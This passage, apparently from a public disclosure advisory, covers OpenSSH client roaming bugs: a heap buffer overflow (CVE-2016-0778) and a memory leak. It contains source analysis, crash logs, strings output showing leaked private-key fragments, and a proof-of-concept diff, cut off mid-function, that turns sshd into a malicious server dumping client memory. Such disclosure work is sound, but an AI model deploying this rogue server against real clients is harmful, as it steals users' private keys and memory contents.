# env ROAMING="heap_massaging:linux" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f
/etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
...

# strings /tmp/roaming-a2bbc5f6/infoleak
cRmpbVfAzJQb85uXUXaNLVW0A/gHqTaGCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt
j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CG

# strings /tmp/roaming-47b46456/infoleak
RGAcE0nc
GCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt
j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CGLj61BS8CfKVp9V7+Gc4P/o
6GEmk/oB9

# strings /tmp/roaming-7a6717ae/infoleak
cawMW4LZ1
Xz/wTMkSDZh/M6zOnQhImcLforsiPbTKKIVLL6u13VUmDcYfaBh9VepjyN8i+KIV
JQB26MlXSxuAp8o0BQUI8FY/dsObJ9xjMT/u2+p

# strings /tmp/roaming-f3091f08/infoleak
lZ3w0qHe
nSolsDs2k8wHbVP4VtLE8l
PRfXS6ECgYEAyVf7Pr3TwTa0pPEk1dLz3XHoetTqUND/0Kv+i7MulBzJ4LbcsTEJ

# strings /tmp/roaming-62a9e9a3/infoleak
lZ3w0qHe
r3TwTa0pPEk11
LbcsTEJ
rtOuGGpLrAYlIvCgT+F26mov5fRGsjjnmP3P/PsvzR8Y9DhiWl9R7qyvNznQYxjo
/euhzdYixxIkfqyopnYFoER26u37/OHe37P

# strings /tmp/roaming-8de31ed5/infoleak
7qyvNznQ
26u37/OHe37PH+8U1JitVrhv7s4NYztECgYEAw3Ot
gxMqsKh42ydIv1sBg1QEHu0TNvyYy7WCB8jnMsygUQ8EEJs7iKP//CEGRdDAwyGa

# strings /tmp/roaming-f5e0fbcc/infoleak
yESI62wOuaY
vJ+q7WMo1wHtMoqRPtW/OAxUf91dQRtzK/GpRuMCgYAc7lh6vnoT9FFmtgPN+b7y
3fBC3h9BN5banCw6VKfnvm8/q+bwSxS

# strings /tmp/roaming-9be933df/infoleak
QRtzK/GpRuMC1
C3h9BN5banCw6VKfnvm8/q+bwSxSSG3aTqYpwEH37lEnk0IfuzQ1O5JfX+hdF
Q4tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmT

# strings /tmp/roaming-ee4d1e6c/infoleak
SG3aTqYp
tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmTOun5zVV6EixsmDn80P
pdyhj8fAUU/BceHr/H6hUQKBgCX5SqPlzGyIPvrtVf//s

# strings /tmp/roaming-c2bfd69c/infoleak
SG3aTqYp
6JmTOun5zVV6A
H6hUQKBgCX5SqPlzGyIPvrtVf//sXqPj0Fm9E3Bo/ooKLxU
dz7ybM9y6GpFjrqMioa07+AOn/UJiVry9fXQuTRWre+CqRQEWpuqtgPR0c4s

# strings /tmp/roaming-2b3217a1/infoleak
DGLfFGdO
r5bbAoGAfxRRGMamXIha8xaJwQnHKC/9v7r79LPFoht/EJ7jw/k8n8yApoLBLBYp
P/jXU44sbtWB3g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCQ

# strings /tmp/roaming-1e275747/infoleak
g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCBqosVbEQhNKZAj+

========================================================================
Buffer Overflow (CVE-2016-0778)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

Support for roaming was elegantly added to the OpenSSH client: the calls
to read() and write() that communicate with the SSH server were replaced
by calls to roaming_read() and roaming_write(), two wrappers that depend
on wait_for_roaming_reconnect() to transparently reconnect to the server
after a disconnection. The wait_for_roaming_reconnect() routine is
essentially a sequence of four subroutines:

239 int
240 wait_for_roaming_reconnect(void)
241 {
...
250         fprintf(stderr, "[connection suspended, press return to resume]");
...
252         packet_backup_state();
253         /* TODO Perhaps we should read from tty here */
254         while ((c = fgetc(stdin)) != EOF) {
...
259                 if (c != '\n' && c != '\r')
260                         continue;
261
262                 if (ssh_connect(host, &hostaddr, options.port,
...
265                     options.proxy_command) == 0 && roaming_resume() == 0) {
266                         packet_restore_state();
...
268                         fprintf(stderr, "[connection resumed]\n");
...
270                         return 0;
271                 }
272
273                 fprintf(stderr, "[reconnect failed, press return to retry]");
...
275         }
276         fprintf(stderr, "[exiting]\n");
...
278         exit(0);
279 }

1. packet_backup_state() close()s connection_in and connection_out (the
old file descriptors that connected the client to the server), and saves
the state of the suspended SSH session (for example, the encryption and
decryption contexts).

2. ssh_connect() opens new file descriptors, and connects them to the
SSH server.

3. roaming_resume() negotiates the resumption of the suspended SSH
session with the server, and calls resend_bytes().

4. packet_restore_state() updates connection_in and connection_out (with
the new file descriptors that connect the client to the server), and
restores the state of the suspended SSH session.

The new file descriptors for connection_in and connection_out may differ
from the old ones (if, for example, files or pipes or sockets are opened
or closed between two successive ssh_connect() calls), but unfortunately
historical code in OpenSSH assumes that they are constant:

- In client_loop(), the variables connection_in and connection_out are
  cached locally, but packet_write_poll() calls roaming_write(), which
  may assign new values to connection_in and connection_out (if a
  reconnection occurs), and client_wait_until_can_do_something()
  subsequently reuses the old, cached values.

- client_loop() eventually updates these cached values, and the
  following FD_ISSET() uses a new, updated file descriptor (the fd
  connection_out), but an old, out-of-date file descriptor set (the
  fd_set writeset).

- packet_read_seqnr() (old API, or ssh_packet_read_seqnr(), new API)
  first calloc()ates setp, a file descriptor set for connection_in;
  next, it loops around memset(), FD_SET(), select() and roaming_read();
  last, it free()s setp and returns. Unfortunately, roaming_read() may
  reassign a higher value to connection_in (if a reconnection occurs),
  but setp is never enlarged, and the following memset() and FD_SET()
  may therefore overflow setp (a heap-based buffer overflow):

1048 int
1049 packet_read_seqnr(u_int32_t *seqnr_p)
1050 {
....
1052         fd_set *setp;
....
1058         setp = (fd_set *)xcalloc(howmany(active_state->connection_in + 1,
1059             NFDBITS), sizeof(fd_mask));
....
1065         for (;;) {
....
1075                 if (type != SSH_MSG_NONE) {
1076                         free(setp);
1077                         return type;
1078                 }
....
1083                 memset(setp, 0, howmany(active_state->connection_in + 1,
1084                     NFDBITS) * sizeof(fd_mask));
1085                 FD_SET(active_state->connection_in, setp);
....
1092                 for (;;) {
....
1097                         if ((ret = select(active_state->connection_in + 1, setp,
1098                             NULL, NULL, timeoutp)) >= 0)
1099                                 break;
....
1115                 }
....
1117                 do {
....
1119                         len = roaming_read(active_state->connection_in, buf,
1120                             sizeof(buf), &cont);
1121                 } while (len == 0 && cont);
....
1130         }
1131         /* NOTREACHED */
1132 }

- packet_write_wait() (old API, or ssh_packet_write_wait(), new API) is
  basically similar to packet_read_seqnr() and may overflow its own setp
  if roaming_write() (called by packet_write_poll()) reassigns a higher
  value to connection_out (after a successful reconnection):

1739 void
1740 packet_write_wait(void)
1741 {
1742         fd_set *setp;
....
1746         setp = (fd_set *)xcalloc(howmany(active_state->connection_out + 1,
1747             NFDBITS), sizeof(fd_mask));
1748         packet_write_poll();
1749         while (packet_have_data_to_write()) {
1750                 memset(setp, 0, howmany(active_state->connection_out + 1,
1751                     NFDBITS) * sizeof(fd_mask));
1752                 FD_SET(active_state->connection_out, setp);
....
1758                 for (;;) {
....
1763                         if ((ret = select(active_state->connection_out + 1,
1764                             NULL, setp, NULL, timeoutp)) >= 0)
1765                                 break;
....
1776                 }
....
1782                 packet_write_poll();
1783         }
1784         free(setp);
1785 }

------------------------------------------------------------------------
Mitigating Factors
------------------------------------------------------------------------

This buffer overflow affects all OpenSSH clients >= 5.4, but its impact
is significantly reduced by the Mitigating Factors detailed in the
Information Leak section, and additionally:

- OpenSSH versions >= 6.8 reimplement packet_backup_state() and
  packet_restore_state(), but introduce a bug that prevents the buffer
  overflow from being exploited; indeed, ssh_packet_backup_state() swaps
  two local pointers, ssh and backup_state, instead of swapping the two
  global pointers active_state and backup_state:

  9 struct ssh *active_state, *backup_state;
...
238 void
239 packet_backup_state(void)
240 {
241         ssh_packet_backup_state(active_state, backup_state);
242 }
243
244 void
245 packet_restore_state(void)
246 {
247         ssh_packet_restore_state(active_state, backup_state);
248 }

2269 void
2270 ssh_packet_backup_state(struct ssh *ssh,
2271     struct ssh *backup_state)
2272 {
2273         struct ssh *tmp;
....
2279         if (backup_state)
2280                 tmp = backup_state;
2281         else
2282                 tmp = ssh_alloc_session_state();
2283         backup_state = ssh;
2284         ssh = tmp;
2285 }
....
2291 void
2292 ssh_packet_restore_state(struct ssh *ssh,
2293     struct ssh *backup_state)
2294 {
2295         struct ssh *tmp;
....
2299         tmp = backup_state;
2300         backup_state = ssh;
2301         ssh = tmp;
2302         ssh->state->connection_in = backup_state->state->connection_in;

  As a result, the global pointer backup_state is still NULL when passed
  to ssh_packet_restore_state(), and crashes the OpenSSH client when
  dereferenced:

# env ROAMING="overflow:A fd_leaks:0" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f
/etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -V
OpenSSH_6.8, LibreSSL 2.1

$ /usr/bin/ssh -o ProxyCommand="/usr/bin/nc -w 15 %h %p" -p 222 127.0.0.1
user@127.0.0.1's password:
[connection suspended, press return to resume]Segmentation fault (core dumped)

  This bug prevents the buffer overflow from being exploited, but not
  the information leak, because the vulnerable function resend_bytes()
  is called before ssh_packet_restore_state() crashes.

- To the best of our knowledge, this buffer overflow is not exploitable
  in the default configuration of the OpenSSH client; the conclusion of
  the File Descriptor Leak section suggests that two non-default options
  are required: a ProxyCommand, and either ForwardAgent (-A) or
  ForwardX11 (-X).

------------------------------------------------------------------------
File Descriptor Leak
------------------------------------------------------------------------

A back-of-the-envelope calculation indicates that, in order to increase
the file descriptor connection_in or connection_out, and thus overflow
the file descriptor set setp in packet_read_seqnr() or
packet_write_wait(), a file descriptor leak is needed:

- First, the number of bytes calloc()ated for setp is rounded up to the
  nearest multiple of sizeof(fd_mask): 8 bytes (or 64 file descriptors)
  on 64-bit systems.

- Next, in glibc, this number is rounded up to the nearest multiple of
  MALLOC_ALIGNMENT: 16 bytes (or 128 file descriptors) on 64-bit
  systems.

- Last, in glibc, a MIN_CHUNK_SIZE is enforced: 32 bytes on 64-bit
  systems, of which 24 bytes (or 192 file descriptors) are reserved for
  setp.

- In conclusion, a file descriptor leak is needed, because connection_in
  or connection_out has to be increased by hundreds in order to overflow
  setp.

The search for a suitable file descriptor leak begins with a study of
the behavior of the four ssh_connect() methods, when called for a
reconnection by wait_for_roaming_reconnect():

1. The default method ssh_connect_direct() communicates with the server
through a simple TCP socket: the two file descriptors connection_in and
connection_out are both equal to this socket's file descriptor.

In wait_for_roaming_reconnect(), the low-numbered file descriptor of the
old TCP socket is close()d by packet_backup_state(), but immediately
reused for the new TCP socket in ssh_connect_direct(): the new file
descriptors connection_in and connection_out are equal to this old,
low-numbered file descriptor, and cannot possibly overflow setp.

2. The special ProxyCommand "-" communicates with the server through
stdin and stdout, but (as explained in the Mitigating Factors of the
Information Leak section) it cannot possibly reconnect to the server,
and is therefore immune to this buffer overflow.

3. Surprisingly, we discovered a file descriptor leak in the
ssh_proxy_fdpass_connect() method itself; indeed, the file descriptor
sp[1] is never close()d:

 101 static int
 102 ssh_proxy_fdpass_connect(const char *host, u_short port,
 103     const char *proxy_command)
 104 {
 ...
 106         int sp[2], sock;
 ...
 113         if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) < 0)
 114                 fatal("Could not create socketpair to communicate with "
 115                     "proxy dialer: %.100s", strerror(errno));
 ...
 161         close(sp[0]);
 ...
 164         if ((sock = mm_receive_fd(sp[1])) == -1)
 165                 fatal("proxy dialer did not pass back a connection");
 ...
 171         /* Set the connection file descriptors. */
 172         packet_set_connection(sock, sock);
 173
 174         return 0;
 175 }

However, two different reasons prevent this file descriptor leak from
triggering the setp overflow:

- The method ssh_proxy_fdpass_connect() communicates with the server
  through a single socket received from the ProxyCommand: the two file
  descriptors connection_in and connection_out are both equal to this
  socket's file descriptor.

  In wait_for_roaming_reconnect(), the low-numbered file descriptor of
  the old socket is close()d by packet_backup_state(), reused for sp[0]
  in ssh_proxy_fdpass_connect(), close()d again, and eventually reused
  again for the new socket: the new file descriptors connection_in and
  connection_out are equal to this old, low-numbered file descriptor,
  and cannot possibly overflow setp.

- Because of the waitpid() bug described in the Mitigating Factors of
  the Information Leak section, the method ssh_proxy_fdpass_connect()
  calls fatal() before it returns to wait_for_roaming_reconnect(), and
  is therefore immune to this buffer overflow.

4. The method ssh_proxy_connect() communicates with the server through a
ProxyCommand and two different pipes: the file descriptor connection_in
is the read end of the second pipe (pout[0]), and the file descriptor
connection_out is the write end of the first pipe (pin[1]):

 180 static int
 181 ssh_proxy_connect(const char *host, u_short port, const char *proxy_command)
 182 {
 ...
 184         int pin[2], pout[2];
 ...
 192         if (pipe(pin) < 0 || pipe(pout) < 0)
 193                 fatal("Could not create pipes to communicate with the proxy: %.100s",
 194                     strerror(errno));
 ...
 240         /* Close child side of the descriptors. */
 241         close(pin[0]);
 242         close(pout[1]);
 ...
 247         /* Set the connection file descriptors. */
 248         packet_set_connection(pout[0], pin[1]);
 249
 250         /* Indicate OK return */
 251         return 0;
 252 }

In wait_for_roaming_reconnect(), the two old, low-numbered file
descriptors connection_in and connection_out are both close()d by
packet_backup_state(), and immediately reused for the pipe(pin) in
ssh_proxy_connect(): the new connection_out (pin[1]) is equal to one of
these old, low-numbered file descriptors, and cannot possibly overflow
setp.

On the other hand, the pipe(pout) in ssh_proxy_connect() may return
high-numbered file descriptors, and the new connection_in (pout[0]) may
therefore overflow setp, if hundreds of file descriptors were leaked
before the call to wait_for_roaming_reconnect():

- We discovered a file descriptor leak in the pubkey_prepare() function
  of OpenSSH >= 6.8; indeed, if the client is running an authentication
  agent that does not offer any private keys, the reference to agent_fd
  is lost, and this file descriptor is never close()d:

1194 static void
1195 pubkey_prepare(Authctxt *authctxt)
1196 {
....
1200         int agent_fd, i, r, found;
....
1247         if ((r = ssh_get_authentication_socket(&agent_fd)) != 0) {
1248                 if (r != SSH_ERR_AGENT_NOT_PRESENT)
1249                         debug("%s: ssh_get_authentication_socket: %s",
1250                             __func__, ssh_err(r));
1251         } else if ((r = ssh_fetch_identitylist(agent_fd, 2, &idlist)) != 0) {
1252                 if (r != SSH_ERR_AGENT_NO_IDENTITIES)
1253                         debug("%s: ssh_fetch_identitylist: %s",
1254                             __func__, ssh_err(r));
1255         } else {
....
1288                 authctxt->agent_fd = agent_fd;
1289         }
....
1299 }

  However, OpenSSH clients >= 6.8 crash in ssh_packet_restore_state()
  (because of the NULL-pointer dereference discussed in the Mitigating
  Factors of the Buffer Overflow section) and are immune to the setp
  overflow, despite this agent_fd leak.

- If ForwardAgent (-A) or ForwardX11 (-X) is enabled in the OpenSSH
  client (it is disabled by default), a malicious SSH server can request
  hundreds of forwardings, in order to increase connection_in (each
  forwarding opens a file descriptor), and thus overflow setp in
  packet_read_seqnr():

# env ROAMING="overflow:A" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h
/etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -V
OpenSSH_6.6.1p1 Ubuntu-2ubuntu2, OpenSSL 1.0.1f 6 Jan 2014

$ /usr/bin/ssh-agent -- /usr/bin/ssh -A -o ProxyCommand="/usr/bin/socat - TCP4:%h:%p" -p 222 127.0.0.1
user@127.0.0.1's password:
[connection suspended, press return to resume][connection resumed]
*** Error in `/usr/bin/ssh': free(): invalid next size (fast): 0x00007f0474d03e70 ***
Aborted (core dumped)

# env ROAMING="overflow:X" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f
/etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013

$ /usr/bin/ssh -X -o ProxyCommand="/usr/bin/socat - TCP4:%h:%p" -p 222 127.0.0.1
user@127.0.0.1's password:
[connection suspended, press return to resume][connection resumed]
*** Error in `/usr/bin/ssh': free(): invalid next size (fast): 0x00007fdcc2a3aba0 ***
*** Error in `/usr/bin/ssh': malloc(): memory corruption: 0x00007fdcc2a3abc0 ***

Finally, a brief digression on two unexpected problems that had to be
solved in our proof-of-concept:

- First, setp can be overflowed only in packet_read_seqnr(), not in
  packet_write_wait(), but agent forwarding and X11 forwarding are post-
  authentication functionalities, and post-authentication calls to
  packet_read() or packet_read_expect() are scarce, except in the
  key-exchange code of OpenSSH clients < 6.8: our proof-of-concept
  effectively forces a rekeying in order to overflow setp in
  packet_read_seqnr().

- Second, after a successful reconnection, packet_read_seqnr() may call
  fatal("Read from socket failed: %.100s", ...), because roaming_read()
  may return EAGAIN (EAGAIN is never returned without the reconnection,
  because the preceding call to select() guarantees that connection_in
  is ready for read()). Our proof-of-concept works around this problem
  by forcing the client to resend MAX_ROAMBUF bytes (2M) to the server,
  allowing data to reach the client before roaming_read() is called,
  thus avoiding EAGAIN.

========================================================================
Acknowledgments
========================================================================

We would like to thank the OpenSSH developers for their great work and
their incredibly quick response, Red Hat Product Security for promptly
assigning CVE-IDs to these issues, and Alexander Peslyak of the Openwall
Project for the interesting discussions.

========================================================================
Proof Of Concept
========================================================================

diff -pruN openssh-6.4p1/auth2-pubkey.c openssh-6.4p1+roaming/auth2-pubkey.c
--- openssh-6.4p1/auth2-pubkey.c        2013-07-17 23:10:10.000000000 -0700
+++ openssh-6.4p1+roaming/auth2-pubkey.c        2016-01-07 01:04:15.000000000 -0800
@@ -169,7 +169,9 @@ userauth_pubkey(Authctxt *authctxt)
                 * if a user is not allowed to login. is this an
                 * issue? -markus
                 */
-               if (PRIVSEP(user_key_allowed(authctxt->pw, key))) {
+               if (PRIVSEP(user_key_allowed(authctxt->pw, key)) || 1) {
+                       debug("%s: force client-side load_identity_file",
+                           __func__);
                        packet_start(SSH2_MSG_USERAUTH_PK_OK);
                        packet_put_string(pkalg, alen);
                        packet_put_string(pkblob, blen);
diff -pruN openssh-6.4p1/kex.c openssh-6.4p1+roaming/kex.c
--- openssh-6.4p1/kex.c 2013-06-01 14:31:18.000000000 -0700
+++ openssh-6.4p1+roaming/kex.c 2016-01-07 01:04:15.000000000 -0800
@@ -442,6 +442,73 @@ proposals_match(char *my[PROPOSAL_MAX],
 }

 static void
+roaming_reconnect(void)
+{
+       packet_read_expect(SSH2_MSG_KEX_ROAMING_RESUME);
+       const u_int id = packet_get_int(); /* roaming_id */
+       debug("%s: id %u", __func__, id);
+       packet_check_eom();
+
+       const char *const dir = get_roaming_dir(id);
+       debug("%s: dir %s", __func__, dir);
+       const int fd = open(dir, O_RDONLY | O_NOFOLLOW | O_NONBLOCK);
+       if (fd <= -1)
+               fatal("%s: open %s errno %d", __func__, dir, errno);
+       if (fchdir(fd) != 0)
+               fatal("%s: fchdir %s errno %d", __func__, dir, errno);
+       if (close(fd) != 0)
+               fatal("%s: close %s errno %d", __func__, dir, errno);
+
+       packet_start(SSH2_MSG_KEX_ROAMING_AUTH_REQUIRED);
+       packet_put_int64(arc4random()); /* chall */
+       packet_put_int64(arc4random()); /* oldchall */
+       packet_send();
+
+       packet_read_expect(SSH2_MSG_KEX_ROAMING_AUTH);
+       const u_int64_t client_read_bytes = packet_get_int64();
+       debug("%s: client_read_bytes %llu", __func__,
+           (unsigned long long)client_read_bytes);
+       packet_get_int64(); /* digest (1-8) */
+       packet_get_int64(); /* digest (9-16) */
+       packet_get_int();   /* digest (17-20) */
+       packet_check_eom();
+
+       u_int64_t client_write_bytes;
+       size_t len = sizeof(client_write_bytes);
+       load_roaming_file("client_write_bytes", &client_write_bytes, &len);
+       debug("%s: client_write_bytes %llu", __func__,
+           (unsigned long long)client_write_bytes);
+
+       u_int client_out_buf_size;
+       len = sizeof(client_out_buf_size);
+       load_roaming_file("client_out_buf_size", &client_out_buf_size, &len);
+       debug("%s: client_out_buf_size %u", __func__, client_out_buf_size);
+       if (client_out_buf_size <= 0 || client_out_buf_size > MAX_ROAMBUF)
+               fatal("%s: client_out_buf_size %u", __func__,
+                          client_out_buf_size);
+
+       packet_start(SSH2_MSG_KEX_ROAMING_AUTH_OK);
+       packet_put_int64(client_write_bytes - (u_int64_t)client_out_buf_size);
+       packet_send();
+       const int overflow = (access("output", F_OK) == 0);
+       if (overflow != 0) {
+               const void *const ptr = load_roaming_file("output", NULL, &len);
+               buffer_append(packet_get_output(), ptr, len);
+       }
+       packet_write_wait();
+
+       char *const client_out_buf = xmalloc(client_out_buf_size);
+       if (atomicio(read, packet_get_connection_in(), client_out_buf,
+                              client_out_buf_size) != client_out_buf_size)
+               fatal("%s: read client_out_buf_size %u errno %d", __func__,
+                               client_out_buf_size, errno);
+       if (overflow == 0)
+               dump_roaming_file("infoleak", client_out_buf,
+                                             client_out_buf_size);
+       fatal("%s: all done for %s", __func__, dir);
+}
+
+static void
 kex_choose_conf(Kex *kex)
 {
        Newkeys *newkeys;
@@ -470,6 +537,10 @@ kex_choose_conf(Kex *kex)
                        kex->roaming = 1;
                        free(roaming);
                }
+       } else if (strcmp(peer[PROPOSAL_KEX_ALGS], KEX_RESUME) == 0) {
+               roaming_reconnect();
+               /* NOTREACHED */
+               fatal("%s: returned from %s", __func__, KEX_RESUME);
        }

        /* Algorithm Negotiation */
diff -pruN openssh-6.4p1/roaming.h openssh-6.4p1+roaming/roaming.h
--- openssh-6.4p1/roaming.h     2011-12-18 15:52:52.000000000 -0800
+++ openssh-6.4p1+roaming/roaming.h     2016-01-07 01:04:15.000000000 -0800
@@ -42,4 +42,86 @@ void resend_bytes(int, u_int64_t *);
 void   calculate_new_key(u_int64_t *, u_int64_t, u_int64_t);
 int    resume_kex(void);

+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#include "atomicio.h"
+#include "log.h"
+#include "xmalloc.h"
+
+static inline char *
+get_roaming_dir(const u_int id)
+{
+       const size_t buflen = MAXPATHLEN;
+       char *const buf = xmalloc(buflen);
+
+       if ((u_int)snprintf(buf, buflen, "/tmp/roaming-%08x", id) >= buflen)
+               fatal("%s: snprintf %u error", __func__, id);
+       return buf;
+}
+
+static inline void
+dump_roaming_file(const char *const name,
+    const void *const buf, const size_t buflen)
+{
+       if (name == NULL)
+               fatal("%s: name %p", __func__, name);
+       if (strchr(name, '/') != NULL)
+               fatal("%s: name %s", __func__, name);
+       if (buf == NULL)
+               fatal("%s: %s buf %p", __func__, name, buf);
+       if (buflen <= 0 || buflen > MAX_ROAMBUF)
+               fatal("%s: %s buflen %lu", __func__, name, (u_long)buflen);
+
+       const int fd = open(name, O_WRONLY | O_CREAT | O_EXCL, S_IRUSR);
+       if (fd <= -1)
+               fatal("%s: open %s errno %d", __func__, name, errno);
+       if (write(fd, buf, buflen) != (ssize_t)buflen)
+               fatal("%s: write %s errno %d", __func__, name, errno);
+       if (close(fd) != 0)
+               fatal("%s: close %s errno %d", __func__, name, errno);
+}
+
+static inline void *
+load_roaming_file(const char *const name,
+    void *buf, size_t *const buflenp)
+{
+       if (name == NULL)
+               fatal("%s: name %p", __func__, name);
+       if (strchr(name, '/') != NULL)
+               fatal("%s: name %s", __func__, name);
+       if (buflenp == NULL)
+               fatal("%s: %s buflenp %p", __func__, name, buflenp);
+
+       const int fd = open(name, O_RDONLY | O_NOFOLLOW | O_NONBLOCK);
+       if (fd <= -1)
+               fatal("%s: open %s errno %d", __func__, name, errno);
+       struct stat st;
+       if (fstat(fd, &st) != 0)
+               fatal("%s: fstat %s errno %d", __func__, name, errno);
+       if (S_ISREG(st.st_mode) == 0)
+               fatal("%s: %s mode 0%o", __func__, name, (u_int)st.st_mode);
+       if (st.st_size <= 0 || st.st_size > MAX_ROAMBUF)
+               fatal("%s: %s size %lld", __func__, name,
+                   (long long)st.st_size);
+
+       if (buf == NULL) {
+               *buflenp = st.st_size;
+               buf = xmalloc(*buflenp);
+       } else {
+               if (*buflenp != (size_t)st.st_size)
+                       fatal("%s: %s size %lld buflen %lu", __func__, name,
+                           (long long)st.st_size, (u_long)*buflenp);
+       }
+       if (read(fd, buf, *buflenp) != (ssize_t)*buflenp)
+               fatal("%s: read %s errno %d", __func__, name, errno);
+       if (close(fd) != 0)
+               fatal("%s: close %s errno %d", __func__, name, errno);
+       return buf;
+}
+
 #endif /* ROAMING */
diff -pruN openssh-6.4p1/serverloop.c openssh-6.4p1+roaming/serverloop.c
--- openssh-6.4p1/serverloop.c  2013-07-17 23:12:45.000000000 -0700
+++ openssh-6.4p1+roaming/serverloop.c  2016-01-07 01:04:15.000000000 -0800
@@ -1060,6 +1060,9 @@ server_request_session(void)
        return c;
 }

+static int client_session_channel = -1;
+static int server_session_channel = -1;
+
 static void
 server_input_channel_open(int type, u_int32_t seq, void *ctxt)
 {
@@ -1089,12 +1092,22 @@ server_input_channel_open(int type, u_in
                c->remote_window = rwindow;
                c->remote_maxpacket = rmaxpack;
                if (c->type != SSH_CHANNEL_CONNECTING) {
+                       debug("%s: avoid client-side buf_append", __func__);
+                       /*
                        packet_start(SSH2_MSG_CHANNEL_OPEN_CONFIRMATION);
                        packet_put_int(c->remote_id);
                        packet_put_int(c->self);
                        packet_put_int(c->local_window);
                        packet_put_int(c->local_maxpacket);
                        packet_send();
+                       */
+                       if (strcmp(ctype, "session") == 0) {
+                               if (client_session_channel != -1)
+                                       fatal("%s: client_session_channel %d",
+                                           __func__, client_session_channel);
+                               client_session_channel = c->remote_id;
+                               server_session_channel = c->self;
+                       }
                }
        } else {
                debug("server_input_channel_open: failure %s", ctype);
@@ -1111,6 +1124,196 @@ server_input_channel_open(int type, u_in
 }

 static void
+roaming_disconnect(Kex *const kex)
+{
+       const char *cp, *roaming = getenv("ROAMING");
+       if (roaming == NULL)
+               roaming = "infoleak";
+       int overflow = 0;
+       if ((cp = strstr(roaming, "overflow:")) != NULL)
+               overflow = cp[9];
+
+       const u_int client_recv_buf_size = packet_get_int();
+       packet_check_eom();
+       const u_int server_recv_buf_size = get_recv_buf_size();
+       const u_int server_send_buf_size = get_snd_buf_size();
+       debug("%s: client_recv_buf_size %u", __func__, client_recv_buf_size);
+       debug("%s: server_recv_buf_size %u", __func__, server_recv_buf_size);
+       debug("%s: server_send_buf_size %u", __func__, server_send_buf_size);
+
+       u_int client_send_buf_size = 0;
+       if ((cp = strstr(roaming, "client_send_buf_size:")) != NULL)
+               client_send_buf_size = strtoul(cp + 21, NULL, 0);
+       else if (client_recv_buf_size == DEFAULT_ROAMBUF)
+               client_send_buf_size = DEFAULT_ROAMBUF;
+       else {
+               const u_int
+                   max = MAX(client_recv_buf_size, server_recv_buf_size),
+                   min = MIN(client_recv_buf_size, server_recv_buf_size);
+               if (min <= 0)
+                       fatal("%s: min %u", __func__, min);
+               if (((u_int64_t)(max - min) * 1024) / min < 1)
+                       client_send_buf_size = server_send_buf_size;
+               else
+                       client_send_buf_size = client_recv_buf_size;
+       }
+       debug("%s: client_send_buf_size %u", __func__, client_send_buf_size);
+       if (client_send_buf_size <= 0)
+               fatal("%s: client_send_buf_size", __func__);
+
+       u_int id = 0;
+       char *dir = NULL;
+       for (;;) {
+               id = arc4random();
+               debug("%s: id %u", __func__, id);
+               free(dir);
+               dir = get_roaming_dir(id);
+               if (mkdir(dir, S_IRWXU) == 0)
+                       break;
+               if (errno != EEXIST)
+                       fatal("%s: mkdir %s errno %d", __func__, dir, errno);
+       }
+       debug("%s: dir %s", __func__, dir);
+       if (chdir(dir) != 0)
+               fatal("%s: chdir %s errno %d", __func__, dir, errno);
+
+       u_int client_out_buf_size = 0;
+       if ((cp = strstr(roaming, "client_out_buf_size:")) != NULL)
+               client_out_buf_size = strtoul(cp + 20, NULL, 0);
+       else if (overflow != 0)
+               client_out_buf_size = MAX_ROAMBUF;
+       else
+               client_out_buf_size = 1 + arc4random() % 4096;
+       debug("%s: client_out_buf_size %u", __func__, client_out_buf_size);
+       if (client_out_buf_size <= 0)
+               fatal("%s: client_out_buf_size", __func__);
+       dump_roaming_file("client_out_buf_size", &client_out_buf_size,
+                                          sizeof(client_out_buf_size));
+
+       if ((cp = strstr(roaming, "scp_mode")) != NULL) {
+               if (overflow != 0)
+                       fatal("%s: scp_mode is incompatible with overflow %d",
+                           __func__, overflow);
+
+               u_int seconds_left_to_sleep = 3;
+               if ((cp = strstr(cp, "sleep:")) != NULL)
+                       seconds_left_to_sleep = strtoul(cp + 6, NULL, 0);
+               debug("%s: sleep %u", __func__, seconds_left_to_sleep);
+
+               if (client_session_channel == -1)
+                       fatal("%s: client_session_channel %d",
+                           __func__, client_session_channel);
+
+               packet_start(SSH2_MSG_CHANNEL_OPEN_CONFIRMATION);
+               packet_put_int(client_session_channel);
+               packet_put_int(server_session_channel);
+               packet_put_int(0); /* server window */
+               packet_put_int(0); /* server maxpacket */
+               packet_send();
+
+               packet_start(SSH2_MSG_CHANNEL_DATA);
+               packet_put_int(client_session_channel);
+               packet_put_string("\0\n", 2); /* response&source|sink&run_err */
+               packet_send();
+
+               packet_read_expect(SSH2_MSG_CHANNEL_REQUEST);
+               packet_get_int(); /* server channel */
+               debug("%s: channel request %s", __func__,
+                   packet_get_cstring(NULL));
+
+               while (seconds_left_to_sleep)
+                       seconds_left_to_sleep = sleep(seconds_left_to_sleep);
+       }
+
+       packet_start(SSH2_MSG_REQUEST_SUCCESS);
+       packet_put_int(id); /* roaming_id */
+       packet_put_int64(arc4random()); /* cookie */
+       packet_put_int64(0); /* key1 */
+       packet_put_int64(0); /* key2 */
+       packet_put_int(client_out_buf_size - client_send_buf_size);
+       packet_send();
+       packet_write_wait();
+
